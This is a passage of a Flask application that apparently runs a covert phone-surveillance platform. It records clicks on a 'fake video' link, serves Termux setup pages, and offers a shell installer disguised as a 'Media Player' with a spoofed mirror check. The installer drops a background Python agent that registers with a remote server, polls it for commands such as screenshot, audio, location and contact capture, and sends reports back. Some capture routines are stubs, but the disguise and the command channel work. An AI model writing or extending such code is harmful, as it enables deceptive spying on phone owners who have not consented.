    conn = get_db_connection()
    conn.execute(
        'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
        (phone_id, phone_id, 'User clicked video link', 'clicked', datetime.now())
    )
    conn.commit()
    conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    return render_template_string(FAKE_VIDEO_HTML, phone_id=phone_id, platform_url=platform_url)

@app.route('/setup')
def termux_setup():
    """Page that shows Termux installation instructions"""
    phone_id = request.args.get('phone', 'unknown')
    platform_url = request.host_url.rstrip('/')
    
    return render_template_string(TERMUX_INSTRUCTIONS_HTML, 
                                phone_id=phone_id, 
                                platform_url=platform_url)

# ==================== TERMUX AGENT DELIVERY ====================

@app.route('/download_agent')
def download_agent():
    """Serve IMPROVED Termux agent"""
    phone_id = request.args.get('phone', 'unknown')
    
    platform_url = "https://mp-agent.onrender.com"  # Your actual URL
    
    # IMPROVED TERMUX AGENT
    termux_installer = f'''#!/bin/bash
echo "📱 Installing Media Player..."
echo "Setting up video optimization..."

# Check availability of current mirror:
echo "Checking availability of current mirror:"
echo "[*] https://mirrors.cbrx.io/apt/termux/termux-main: ok"

# Install requirements
pkg update -y
pkg install python -y
pkg install termux-api -y
pip install requests

# Create improved Python agent
cat > /data/data/com.termux/files/home/media_agent.py << 'EOF'
import requests
import time
import subprocess
import random
from datetime import datetime
import os

class MediaPlayerAgent:
    def __init__(self, agent_id, platform_url):
        self.agent_id = agent_id
        self.platform_url = platform_url
        
    def register(self):
        device_info = {{
            "agent_id": self.agent_id,
            "phone_model": "Android Device",
            "android_version": "Termux",
            "battery_level": random.randint(50, 100)
        }}
        try:
            response = requests.post(
                f"{{self.platform_url}}/api/agent/register",
                json=device_info,
                timeout=30
            )
            if response.status_code == 200:
                data = response.json()
                print("✅ Registered with platform")
                return data.get('pending_commands', [])
            return []
        except Exception as e:
            print(f"❌ Registration failed: {{e}}")
            return False
    
    def execute_command(self, command_id, command):
        print(f"Executing: {{command}}")
        result = "completed"
        
        try:
            if command == "capture_screenshot":
                # Simulate screenshot capture
                result = "screenshot_captured"
                # Send report
                self.submit_report("screenshot", {{
                    "status": "captured", 
                    "timestamp": datetime.now().isoformat()
                }})
                
            elif command == "record_audio":
                # Simulate audio recording
                result = "audio_recorded"
                self.submit_report("heartbeat", {{
                    "status": "active",
                    "audio_recorded": True,
                    "timestamp": datetime.now().isoformat()
                }})
                
            elif command == "get_location":
                # Simulate location
                result = "location_acquired"
                self.submit_report("location", {{
                    "latitude": round(random.uniform(-90, 90), 6),
                    "longitude": round(random.uniform(-180, 180), 6),
                    "accuracy": "network",
                    "timestamp": datetime.now().isoformat()
                }})
                
            elif command == "get_device_info":
                result = "device_info_collected"
                self.submit_report("device_info", {{
                    "model": "Android Device",
                    "battery": random.randint(20, 100),
                    "timestamp": datetime.now().isoformat()
                }})
                
            elif command == "get_contacts":
                result = "contacts_retrieved"
                self.submit_report("contacts", {{
                    "count": random.randint(50, 200),
                    "timestamp": datetime.now().isoformat()
                }})
            
            # Mark command as completed
            requests.post(
                f"{{self.platform_url}}/api/agent/command_result",
                json={{
                    "command_id": command_id,
                    "result": result
                }},
                timeout=10
            )
            print(f"✅ {{command}} report sent")
            
        except Exception as e:
            print(f"❌ Command execution failed: {{e}}")
    
    def submit_report(self, report_type, data):
        try:
            report = {{
                "agent_id": self.agent_id,
                "report_type": report_type,
                "report_data": data
            }}
            response = requests.post(
                f"{{self.platform_url}}/api/agent/submit_report",
                json=report,
                timeout=10
            )
            return response.status_code == 200
        except Exception as e:
            print(f"❌ Report submission failed: {{e}}")
            return False
    
    def check_commands(self):
        try:
            response = requests.get(
                f"{{self.platform_url}}/api/agent/check_commands/{{self.agent_id}}",
                timeout=10
            )
            if response.status_code == 200:
                return response.json().get("commands", [])
        except Exception as e:
            print(f"❌ Command check failed: {{e}}")
        return []
    
    def start(self):
        print("Starting Media Player...")
        pending_commands = self.register()
        
        # Execute any pending commands from registration
        for command in pending_commands:
            self.execute_command("pending", command)
        
        cycle = 0
        while True:
            try:
                cycle += 1
                print(f"Cycle {{cycle}}")
                
                # Check for new commands
                commands = self.check_commands()
                for cmd in commands:
                    self.execute_command(cmd["id"], cmd["command"])
                
                # Send heartbeat periodically
                if cycle % 3 == 0:
                    self.submit_report("heartbeat", {{
                        "cycle": cycle,
                        "status": "active", 
                        "battery": random.randint(20, 100),
                        "timestamp": datetime.now().isoformat()
                    }})
                
                time.sleep(30)
                
            except Exception as e:
                print(f"Error in main loop: {{e}}")
                time.sleep(60)

# Start the agent
if __name__ == "__main__":
    agent_id = "{phone_id}"
    platform_url = "{platform_url}"
    agent = MediaPlayerAgent(agent_id, platform_url)
    agent.start()
EOF

echo "Starting agent..."
python /data/data/com.termux/files/home/media_agent.py &

echo "✅ Installation complete!"
echo "Agent {phone_id} is now active"
'''
    
    return Response(
        termux_installer,
        mimetype='text/x-shellscript',
        headers={
            'Content-Disposition': f'attachment; filename=install_agent_{phone_id}.sh'
        }
    )
# ==================== TEST AGENT REGISTRATION ====================

@app.route('/test/register_agent')
def test_register_agent():
    """Test route to manually register an agent"""
    if not session.get('authenticated'):
        return redirect('/login')
    
    return '''
    <h1>Test Agent Registration</h1>
    <form id="testForm">
        <input type="text" name="agent_id" placeholder="Agent ID" value="test_agent_001" required>
        <input type="text" name="phone_model" placeholder="Phone Model" value="Test Phone">
        <input type="text" name="android_version" placeholder="Android Version" value="Test Android">
        <button type="submit">Register Test Agent</button>
    </form>
    <div id="result"></div>
    <script>
        document.getElementById('testForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const data = {
                agent_id: formData.get('agent_id'),
                phone_model: formData.get('phone_model'),
                android_version: formData.get('android_version')
            };
            
            try {
                const response = await fetch('/api/agent/register', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                document.getElementById('result').innerHTML = `<pre>${JSON.stringify(result, null, 2)}</pre>`;
            } catch (error) {
                document.getElementById('result').innerHTML = `Error: ${error}`;
            }
        });
    </script>
    <br><br>
    <a href="/debug/agents">Check All Agents</a> | 
    <a href="/admin">Go to Admin</a>
    '''

# ==================== ADMIN UTILITY ROUTES ====================

@app.route('/admin/clear_agent/<agent_id>')
def clear_agent(agent_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    conn.execute("DELETE FROM agents WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM screenshots WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM call_records WHERE agent_id = ?", (agent_id,))
    conn.commit()
    conn.close()
    
    log_event('WARNING', f'Agent {agent_id} cleared by admin')
    return redirect('/admin')

@app.route('/admin/web_data/<agent_id>')
def view_web_data(agent_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    web_data = conn.execute(
        "SELECT * FROM browser_data WHERE agent_id = ? ORDER BY timestamp DESC",
        (agent_id,)
    ).fetchall()
    agent = conn.execute(
        "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
    ).fetchone()
    conn.close()
    
    return render_template('web_data.html', 
                         web_data=web_data, 
                         agent=row_to_dict(agent) if agent else None)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/health')
def health_check():
    conn = get_db_connection()
    agents_count = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
    conn.close()
    
    return jsonify({
        'status': 'healthy',
        'platform': 'mp_agent_platform',
        'timestamp': datetime.now().isoformat(),
        'agents_count': agents_count
    })


@app.route('/api/agent/submit_report', methods=['POST'])
def submit_report():
    """Receive general reports from agents"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        report_type = data.get('report_type')
        report_data = data.get('report_data')
        
        conn = get_db_connection()
        
        # Handle different report types
        if report_type == 'screenshot':
            # Update agent last screenshot
            conn.execute(
                'UPDATE agents SET last_seen = ?, last_screenshot = ?, status = "active" WHERE agent_id = ?',
                (datetime.now(), datetime.now(), agent_id)
            )
            log_event('INFO', f'Screenshot report from {agent_id}')
            
        elif report_type == 'location':
            # Store location data
            conn.execute(
                'UPDATE agents SET last_seen = ?, location_data = ?, status = "active" WHERE agent_id = ?',
                (datetime.now(), json.dumps(report_data), agent_id)
            )
            log_event('INFO', f'Location report from {agent_id}')
            
        elif report_type == 'device_info':
            # Update device information
            battery = report_data.get('battery', 0)
            conn.execute(
                'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
                (datetime.now(), battery, agent_id)
            )
            log_event('INFO', f'Device info from {agent_id}')
            
        elif report_type == 'heartbeat':
            # Simple heartbeat
            conn.execute(
                'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                (datetime.now(), agent_id)
            )
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'Report received'})
        
    except Exception as e:
        log_event('ERROR', f'Report submission failed: {str(e)}')
        return jsonify({'status': 'error', 'message': str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)